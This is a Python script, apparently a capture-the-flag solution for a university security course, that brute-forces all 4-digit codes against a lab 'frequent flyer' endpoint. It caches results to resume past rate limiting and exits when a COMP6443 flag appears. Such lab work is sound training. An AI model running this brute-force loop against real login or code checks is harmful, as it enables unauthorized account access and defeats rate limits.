import requests
import os
import re
import json
from pathlib import Path

session = requests.Session()
session.cert = os.path.join(os.path.dirname(__file__), "../../z5437741.pem")

URL = "https://quoccaair-ff.quoccacorp.com/flag"
FLAG_PATTERN = r"(COMP6443{.+?})"
RESULTS_FILENAME = "quoccaair_frequent_flyer.json"
INCORRECT_CODE_MSG = "Sorry, that code is not correct."
TOO_MANY_REQUESTS_MSG = "Too Many Requests"

if Path(RESULTS_FILENAME).exists():
    with open(RESULTS_FILENAME, "r") as f:
        results = json.load(f)
else:
    results = {}

def find_flag(text: str):
    if flag_match := re.search(FLAG_PATTERN, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def main():
    try:
        for i in range(10000):
            code = f"{i:04}"
            if code in results and results[code] == INCORRECT_CODE_MSG:
                print(f"Skipping {code = }")
                continue

            print(f"{code = }")
            response = session.post(URL, data={"code": code})
            response_text = response.content.decode("utf-8", "ignore")
            find_flag(response_text)

            if INCORRECT_CODE_MSG in response_text:
                results[code] = INCORRECT_CODE_MSG
            elif TOO_MANY_REQUESTS_MSG in response_text:
                results[code] = TOO_MANY_REQUESTS_MSG
    except Exception as e:
        print(e)
    finally:
        with open(RESULTS_FILENAME, "w") as f:
            json.dump(results, f, indent=4)

if __name__ == "__main__":
    main()